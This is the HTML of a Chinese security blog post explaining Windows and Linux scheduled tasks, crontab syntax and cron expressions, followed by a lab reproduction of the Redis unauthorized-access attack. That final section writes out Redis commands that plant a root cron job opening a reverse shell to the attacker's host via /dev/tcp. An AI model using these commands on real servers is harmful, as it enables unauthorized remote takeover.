@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="计划任务详解0x00 前言​      复现完若依后台的getshell的漏洞后，感觉计划任务这块内容用的还挺多的，除了刚刚复现的这个后台写入计划任务getshell，还有redis写入计划任务getshell，包括应急响应中也时常考虑计划任务那块是不是会有后门的存在。因为总是会疏忽计划任务这块内容，所以写这篇记录一下，顺便末尾再复现一下redis写入计划任务getshell。 0x01 wind">
+<meta property="og:type" content="article">
+<meta property="og:title" content="计划任务详解">
+<meta property="og:url" content="https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="杰同学的自留地">
+<meta property="og:description" content="计划任务详解0x00 前言​      复现完若依后台的getshell的漏洞后，感觉计划任务这块内容用的还挺多的，除了刚刚复现的这个后台写入计划任务getshell，还有redis写入计划任务getshell，包括应急响应中也时常考虑计划任务那块是不是会有后门的存在。因为总是会疏忽计划任务这块内容，所以写这篇记录一下，顺便末尾再复现一下redis写入计划任务getshell。 0x01 wind">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647411943-4d22f1b0-7bf3-460f-a83f-56d3d866760c.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647716017-38f93752-5e24-4eb3-920b-8d831bcb9de2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647825532-eb1a375c-e473-44d7-8d88-89205a5ab889.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702712259725-eaea7bff-df5e-4725-b02f-76c7b2b79866.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702712495677-366dce47-d0a2-43b8-95a0-1271d53d9f07.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702785458048-0f5c5a08-e518-43dc-a146-bf2eb87c57cc.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702785943797-c1c4a239-9763-4b07-baa5-4813a1a0e0d8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702786057207-e425186b-eb69-40be-bf94-2099e00f7a86.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702786013177-279c28ac-77ab-44a3-aae8-c68e3610cbcc.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702782868667-8e42b3d9-bbd2-44df-b821-3c8bea657324.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702783121822-bbc3e278-2372-4d63-8f43-6a2ed634b738.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702783281278-8e882a8a-8126-4ccb-8b6b-2336ea3e3735.png">
+<meta property="article:published_time" content="2023-12-16T07:47:12.000Z">
+<meta property="article:modified_time" content="2023-12-23T05:20:12.000Z">
+<meta property="article:author" content="anch0r">
+<meta property="article:tag" content="计划任务">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647411943-4d22f1b0-7bf3-460f-a83f-56d3d866760c.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>计划任务详解</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/12/17/%E4%BA%91%E6%B8%97%E9%80%8F%E4%B9%8BAK-SK%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/12/14/%E8%8B%A5%E4%BE%9D-cms-%E5%90%8E%E5%8F%B0%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-RCE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&text=计划任务详解"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&is_video=false&description=计划任务详解"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=计划任务详解&body=Check out this article: https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&title=计划任务详解"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&name=计划任务详解&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.anch0r.top/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/&t=计划任务详解"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">计划任务详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-windows%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 windows计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 linux计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Ecron"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">关于cron</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crontab%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">crontab常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crontab%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">crontab配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cron%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.3.4.</span> <span class="toc-text">cron表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%99%E5%85%A5%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 redis未授权漏洞复现（写入计划任务反弹shell）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.4.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.4.2.</span> <span class="toc-text">漏洞产生原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8D%A2%E6%88%90centos%E7%8E%AF%E5%A2%83%E7%BB%A7%E7%BB%AD%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">换成centos环境继续测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.4.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        计划任务详解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">anch0r</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-16T07:47:12.000Z" class="dt-published" itemprop="datePublished">2023-12-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/" rel="tag">计划任务</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="计划任务详解"><a href="#计划任务详解" class="headerlink" title="计划任务详解"></a>计划任务详解</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​      复现完若依后台的getshell的漏洞后，感觉计划任务这块内容用的还挺多的，除了刚刚复现的这个后台写入计划任务getshell，还有redis写入计划任务getshell，包括应急响应中也时常考虑计划任务那块是不是会有后门的存在。因为总是会疏忽计划任务这块内容，所以写这篇记录一下，顺便末尾再复现一下redis写入计划任务getshell。</p>
+<h2 id="0x01-windows计划任务"><a href="#0x01-windows计划任务" class="headerlink" title="0x01 windows计划任务"></a>0x01 windows计划任务</h2><p>在“开始”处输入“任务计划程序”即可进入任务计划的程序界面，在该界面中可以看到目前所有已经创建的任务名，还可以自己创建任务、导入任务。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647411943-4d22f1b0-7bf3-460f-a83f-56d3d866760c.png" alt="任务计划程序"></p>
+<p>创建任务时，会让你自己设置触发器，选择合适的时间时间，可以看出windows上设置计划任务还是挺方便的，不过很少有windows用户会用计划任务这块功能。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647716017-38f93752-5e24-4eb3-920b-8d831bcb9de2.png" alt="任务触发器选择"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647825532-eb1a375c-e473-44d7-8d88-89205a5ab889.png" alt="触发时间设置"></p>
+<h2 id="0x02-linux计划任务"><a href="#0x02-linux计划任务" class="headerlink" title="0x02 linux计划任务"></a>0x02 linux计划任务</h2><p>重点还是在linux上，linux的计划任务还是经常使用的。</p>
+<h4 id="关于cron"><a href="#关于cron" class="headerlink" title="关于cron"></a>关于cron</h4><p>linux内置了cron这个进程，它是linux下的定时执行工具，可以在无需人工干预的情况下运行作业。</p>
+<p>我们经常使用的是crontab这条命令，它是cron table的缩写，它是cron的配置文件，也可以叫它作业列表，在以下文件夹内找到相关配置文件。</p>
+<p>●/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，比如tom建的crontab任务对应的文件就是/var/spool/cron/tom。一般一个用户最多只有一个crontab文件。</p>
+<p>●/etc/crontab 这个文件负责调度各种管理和维护任务。</p>
+<p>●/etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本。</p>
+<p>●我们还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p>
+<p>一般在应急响应中可以通过看这几个文件或文件夹下的文件查看是否有写入恶意的计划任务。</p>
+<h3 id="crontab常用命令"><a href="#crontab常用命令" class="headerlink" title="crontab常用命令"></a>crontab常用命令</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab [-u user] file crontab [-u user] [ -e | -l | -r ]</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>参数意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-u user</td>
+<td>用来设定某个用户的crontab服务</td>
+</tr>
+<tr>
+<td>file</td>
+<td>是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。</td>
+</tr>
+<tr>
+<td>-i</td>
+<td>在删除用户的crontab文件时给确认提示。</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>crontab有如下注意点：</p>
+<ol>
+<li>crontab有2种编辑方式：直接编辑/etc/crontab文件与crontab –e，其中/etc/crontab里的计划任务是系统中的计划任务，而用户的计划任务需要通过crontab –e来编辑；</li>
+<li>每次编辑完某个用户的cron设置后，cron自动在/var/spool/cron(kali是在/var/spool/cron/crontabs)下生成一个与此用户同名的文件，此用户的cron信息都记录在这个文件中，这个文件是不可以直接编辑的，只可以用crontab -e 来编辑。</li>
+<li>crontab中的command尽量使用绝对路径，否则会经常因为路径错误导致任务无法执行。</li>
+<li>新创建的cron job不会马上执行，至少要等2分钟才能执行，可重新启动cron来立即执行。</li>
+<li>%在crontab文件中表示“换行”，因此假如脚本或命令含有%,需要使用%来进行转义。</li>
+</ol>
+</blockquote>
+<h3 id="crontab配置"><a href="#crontab配置" class="headerlink" title="crontab配置"></a>crontab配置</h3><p>核心的内容肯定是crontab配置这块了。</p>
+<p>用户所创建的crontab文件中，每一行都代表一项任务，每行的字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，具体的格式可以通过查看 /etc/crontab文件中的注释看到：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702712259725-eaea7bff-df5e-4725-b02f-76c7b2b79866.png" alt="/etc/crontab"></p>
+<p>可能看的不是很清晰，可以再看看下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702712495677-366dce47-d0a2-43b8-95a0-1271d53d9f07.png" alt="Crontab格式说明"></p>
+<p>对于前5个时间字段，可以使用以下特殊字符：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td>代表所有的取值范围内的数字，如月份字段为*，则表示1到12个月；</td>
+</tr>
+<tr>
+<td>/</td>
+<td>代表每一定时间间隔的意思，如分钟字段为*/10，表示每10分钟执行1次。</td>
+</tr>
+<tr>
+<td>-</td>
+<td>代表从某个区间范围，是闭区间。如“2-5”表示“2,3,4,5”，小时字段中0-23/2表示在0~23点范围内每2个小时执行一次。</td>
+</tr>
+<tr>
+<td>,</td>
+<td>分散的数字（不一定连续），如1,2,3,4,7,9。</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>注：由于各个地方每周第一天不一样，因此Sunday=0（第一天）或Sunday=7（最后1天）。</p>
+</blockquote>
+<p>例如： <code>* * * * * /bin/echo "123" &gt;&gt; /home/john/Desktop/1.txt</code></p>
+<p>含义是每隔一分钟，执行一个动作：将字符串”123”追加到桌面上的1.txt文件中。</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>这里我就把菜鸟教程上的实例粘贴过来了，附上地址：</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">Linux Crontab 定时任务 | 菜鸟教程</a></p>
+<p><strong>实例1：每1分钟执行一次myCommand</strong></p>
+<p><code>\* * * * * myCommand</code></p>
+<p><strong>实例2：每小时的第3和第15分钟执行</strong></p>
+<p><code>3,15 * * * * myCommand</code></p>
+<p><strong>实例3：在上午8点到11点的第3和第15分钟执行</strong></p>
+<p><code>3,15 8-11 * * * myCommand</code></p>
+<p><strong>实例4：每隔两天的上午8点到11点的第3和第15分钟执行</strong></p>
+<p><code>3,15 8-11 */2  *  * myCommand</code></p>
+<p><strong>实例5：每周一上午8点到11点的第3和第15分钟执行</strong></p>
+<p><code>3,15 8-11 * * 1 myCommand</code></p>
+<p><strong>实例6：每晚的21:30重启smb</strong></p>
+<p><code>30 21 * * * /etc/init.d/smb restart</code></p>
+<p><strong>实例7：每月1、10、22日的4 : 45重启smb</strong></p>
+<p><code>45 4 1,10,22 * * /etc/init.d/smb restart</code></p>
+<p><strong>实例8：每周六、周日的1 : 10重启smb</strong></p>
+<p><code>10 1 * * 6,0 /etc/init.d/smb restart</code></p>
+<p><strong>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb</strong></p>
+<p><code>0,30 18-23 * * * /etc/init.d/smb restart</code></p>
+<p><strong>实例10：每星期六的晚上11 : 00 pm重启smb</strong></p>
+<p><code>0 23 * * 6 /etc/init.d/smb restart</code></p>
+<p><strong>实例11：每一小时重启smb</strong></p>
+<p><code>0 */1 * * * /etc/init.d/smb restart</code></p>
+<p><strong>实例12：晚上11点到早上7点之间，每隔一小时重启smb</strong></p>
+<p><code>0 23-7/1 * * * /etc/init.d/smb restart</code></p>
+<h3 id="cron表达式"><a href="#cron表达式" class="headerlink" title="cron表达式"></a>cron表达式</h3><p>   比较奇怪的是，linux的cron标准在时间上只有5个域，所以最小只支持到分钟量级的间隔时间，而不支持秒量级的间隔时间，所以又有人提出了cron表达式。</p>
+<p>   cron表达式基本构成为 7个时间字段，即 秒+分+时+天+月+星期+年， 每一段可用的特殊字符除了前面所提到的四个字符外，cron表达式还规定了如下几个特殊字符：</p>
+<table>
+<thead>
+<tr>
+<th>字符</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?</td>
+<td>任何值， 表示不关心具体哪一天，只能用于天（day_of_month）和星期（day_of_week）两个字段</td>
+</tr>
+<tr>
+<td>L</td>
+<td>last，表示某个月最后一天或某个星期的最后一天</td>
+</tr>
+<tr>
+<td>W</td>
+<td>工作日（周一至周五）</td>
+</tr>
+<tr>
+<td>#</td>
+<td>表示某个月的第几个星期几，如4#2表示某月的第二个星期四</td>
+</tr>
+</tbody></table>
+<p>每个字段的取值范围如下：</p>
+<ul>
+<li><p>秒（second）：0~59</p>
+</li>
+<li><p>分钟（minute）：0~59</p>
+</li>
+<li><p>小时（hour）：0~23</p>
+</li>
+<li><p>日（day）：1~31</p>
+</li>
+<li><p>月（month）：1~12或JAN-DEC</p>
+</li>
+<li><p>年（year）：可选，1970~2099或者空</p>
+</li>
+</ul>
+<p>比如上一遍笔记我用到的cron表达式：</p>
+<p><code>0/10 * * * * ? </code></p>
+<p>代表每10秒执行一次任务。</p>
+<p>具体示例可以看阿里云的这篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/133509.html">简单任务CRON表达式的详解_金融分布式架构 SOFAStack(SOFAStack)-阿里云帮助中心</a></p>
+<h2 id="0x03-redis未授权漏洞复现（写入计划任务反弹shell）"><a href="#0x03-redis未授权漏洞复现（写入计划任务反弹shell）" class="headerlink" title="0x03 redis未授权漏洞复现（写入计划任务反弹shell）"></a>0x03 redis未授权漏洞复现（写入计划任务反弹shell）</h2><p>顺便再次复习一下redis未授权访问的漏洞吧。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>ubuntu（192.168.1.133）：redis服务器   模拟靶机</p>
+<p>kali（192.168.1.129）：redis客户端  模拟攻击者</p>
+<p>centos(192.168.1.134) :redis服务器 模拟靶机   （后面加的）</p>
+<p>我的kali中是有redis客户端的，就是在ubuntu上需要安装redis服务，这里就直接从官方网站上下载压缩包，然后解压编译，具体命令如下：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz </span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">cd src</span><br><span class="line">sudo su root  # 必须以root身份编译</span><br><span class="line">make install</span><br><span class="line">make test</span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cd ../</span><br><span class="line">cp redis.conf /etc/redis.conf</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>然后启动redis-server</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702785458048-0f5c5a08-e518-43dc-a146-bf2eb87c57cc.png" alt="ubuntu开启redis-server"></p>
+<h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>主要是因为配置不当，将Redis服务绑定到公共接口，甚至没有密码身份验证。</p>
+<p>在ubuntu中查看redis配置文件/etc/redis.conf，如果bind 127.0.0.1 那行被注释了，当前redis就是被绑定在了0.0.0.0:6379，如果也没有设置requirepass的配置字段，防火墙也没有限定可以连接的源ip，那么就很可能存在redis未授权访问，</p>
+<p>kali端通过redis-cli即可直接连接到redis服务器上。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702785943797-c1c4a239-9763-4b07-baa5-4813a1a0e0d8.png" alt="kali通过redis-cli直接连接到redis服务器"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>redis未授权访问一共三种利用方式：</p>
+<ol>
+<li><p>确定webshell路径后，写入webshell</p>
+</li>
+<li><p>写入ssh-keygen公钥，进行ssh登录</p>
+</li>
+<li><p>写入计划任务反弹shell</p>
+</li>
+</ol>
+<p>由于这篇主题是计划任务，所以这里只复现计划任务反弹shell了。</p>
+<p>在kali连接到redis服务器后，先建立计划任务：</p>
+<p><code>set x "\n* * * * * /bin/bash -i &gt; /dev/tcp/192.168.1.129/6666 0&lt;&amp;1 2&gt;&amp;1\n"</code></p>
+<p>然后将计划任务放到定时任务下：</p>
+<p><code>config set dir /var/spool/cron/</code></p>
+<p>接着设置以root用户的身份执行该任务</p>
+<p><code>config set dbfilename root</code></p>
+<p>最后输入 <code>save</code>命令保存</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702786057207-e425186b-eb69-40be-bf94-2099e00f7a86.png" alt="写入计划任务"></p>
+<p>显示<code>ok</code>表示计划任务写入成功。</p>
+<p>注意：服务端的redis-server需要在root权限下运行，否则在攻击机上最后<code>save</code>时会报错，显示<code>(error) ERR</code></p>
